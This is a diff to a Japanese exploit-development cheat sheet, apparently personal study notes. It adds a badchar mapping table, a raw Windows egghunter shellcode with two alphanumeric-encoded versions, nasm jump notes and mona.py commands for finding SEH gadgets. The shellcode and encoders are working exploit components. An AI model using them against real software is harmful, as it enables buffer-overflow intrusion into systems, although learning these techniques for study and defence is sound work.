@@ -65,7 +65,7 @@
   - [Alpha shellcode](#alpha-shellcode)
     - [GetPC](#getpc)
     - [encode with sub eaxs](#encode-with-sub-eaxs)
-    - [set EIP==REGISTER](#set-eipregister)
+    - [set EIP=REGISTER](#set-eipregister)
     - [Egghunter](#egghunter)
 - [よく見るかたまり](#%E3%82%88%E3%81%8F%E8%A6%8B%E3%82%8B%E3%81%8B%E3%81%9F%E3%81%BE%E3%82%8A)
     - [関数の先頭](#%E9%96%A2%E6%95%B0%E3%81%AE%E5%85%88%E9%A0%AD)
@@ -2631,7 +2631,32 @@ https://code.google.com/archive/p/w32-seh-omelet-shellcode/downloads
 その場合は、`mefvenom`の`x86/alpha_mixed`などでこれらの文字だけを使ってShellcodeを構成する必要がある。   
 しかし、単純に`msfvenom`を実行するだけだとDecoderの部分に使用できない文字が含まれたままになるので、`BufferRegister=ESP`などで、事前にそのShellcodeのアドレスが`ESP`などの指定したレジスタに代入されるようにする！   
 
-そのための解決策として以下があげられる。
+#### badchars
+```txt
+0x7fより大きい場合にどう変更されるのか、事前にmonaで調べておいた方がよさそう！
+
+    |                                               | Memory
+ 50 |71 72 73 74 75 76 77 78 79 7a 7b 7d 7e 7f 80 81| File
+    |                                          c7 fc| Memory
+ 60 |82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91| File
+    |e9 e2 e4 e0 e5 e7 ea eb e8 ef ee ec c4 c5 c9 e6| Memory
+ 70 |92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0 a1| File
+    |c6 f4 f6 f2 fb f9 ff d6 dc a2 a3 a5 50 83 e1 ed| Memory
+ 80 |a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1| File
+    |f3 fa f1 d1 aa ba bf ac ac bd bc a1 ab bb a6 a6| Memory
+ 90 |b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0 c1| File
+    |a6 a6 a6 a6 a6 2b 2b a6 a6 2b 2b 2b 2b 2b 2b 2d| Memory
+ a0 |c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1| File
+    |2d 2b 2d 2b a6 a6 2b 2b 2d 2d a6 2d 2b 2d 2d 2d| Memory
+ b0 |d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0 e1| File
+    |2d 2b 2b 2b 2b 2b 2b 2b 2b a6 5f a6 a6 af 61 df| Memory
+ c0 |e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0 f1| File
+    |47 70 53 73 b5 74 46 54 4f 64 38 66 65 6e 3d b1| Memory
+ d0 |f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff      | File
+    |3d 3d 28 29 f7 98 b0 b7 b7 76 6e b2 a6 a0      | Memory
+    `-----------------------------------------------'
+
+```
 #### GetPC
 NULLbyteが可能なら、`call $+0x5`が有効かも。   
 ```txt
@@ -2836,8 +2861,25 @@ nasm > sub eax,0x5555532e
 
 ```
 #### Egghunter
+EgghunterでShellcodeを見つけてそこに飛ぶ際に、`jmp edi`命令を使うため、`msfvenom`で`BufferRegister=EDI`を指定することでヒープ上にあるShellcodeを実行できる！(はず…)   
+```txt
+# Encode前のEgghunter。ファイル名の文字しか使えない場合、これではだめ
+# 36bytes
+egghunter = "\x31\xd2\x90\x90\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
+egghunter += "w00t" # this is the marker/tag: w00t
+egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
 
+# alpha3でエンコードしたEgghunter.直前にEIP==REGISTERとする必要がある
+# python /opt/alpha3/ALPHA3.py x86 ascii mixedcase  esp --input="egghunter.bin" --verbose
+# 102bytes
+TYhffffk4diFkDql02Dqm0D1CuEE0t3r3t332t4r5N8L7l0p2F1n0p0m4C2v0p02060D5o4J01111n0D3k3Z3R0A395m133G4O3G02
 
+# sub eaxを使ったEncodeをした場合、サイズがそこそこでかくなってしまう。あんまりよろしくない。
+# sub eaxを使ったEncodeではjmp espとかの実行したい小さい命令だけにするべきそう
+# 234bytes
+%JMNN%5211-']U]-1]U]-3^U]P%JMNN%5211-p-Zo-p.Zp-q.apP%JMNN%5211-E'zV-E1}W-F3}WP%JMNN%5211-[l-E-[m-E-[m-EP%JMNN%5211-AS7'-AS71-BT73P%JMNN%5211-T7fE-U8fE-U8fFP%JMNN%5211-P.-1-PG@2-QH@2P%JMNN%5211-3(gU-3)gU-4-gUP%JMNN%5211-Edzz-Edzz-EezzP
+
+```
 ## よく見るかたまり
 #### 関数の先頭
 ```txt
@@ -3406,6 +3448,10 @@ nasm > jz $+0x1
 00000000  74FF              jz 0x1
 nasm > je $+0x1
 00000000  74FF              jz 0x1
+nasm > jae $-0x7e
+00000000  7380              jnc 0xffffff82   ; 最大で0x7e(123bytes)分しかjmpbackできない
+nasm > jae $-0x7f
+00000000  0F837BFFFFFF      jnc near 0xffffff81
 ```
 #### Windows周り
 ##### arwin
@@ -3424,6 +3470,8 @@ https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
 !mona modules
 !mona find -s "¥xff¥xe4" -m slmfc.dll
 !mona seh -m AIMP2.dll -cp unicode    # unicode用のアドレス形式のpop,pop,retを見つける (0x0045000eとか)
+!mona seh -m zip4.exe -cp asciiprint
+  ASCIIプリント可能な文字を含むアドレスだけを表示
 !mona jmp -r esp
   -x X無しでも実行可能な命令だけを検索している
     - Number of pointers of type 'jmp esp' : 34
@@ -3438,6 +3486,8 @@ https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
   baccharsを見つけるために0x00~9xffまでを生成する。.binと.txtが生成される
 !mona compare -f bytearray.bin
 　メモリ内に指定したファイルの内容があるかどうか調べる。badcharsの時に超便利！
+!mona compare -f C:\logs\zip4\badchars.bin
+  存在しないときはエラーになるっぽい？
 !mona find -type asc -s "AAAA"
   メモリ内に文字列があるか検索する。便利
 !mona stackpivot -distance 4,4
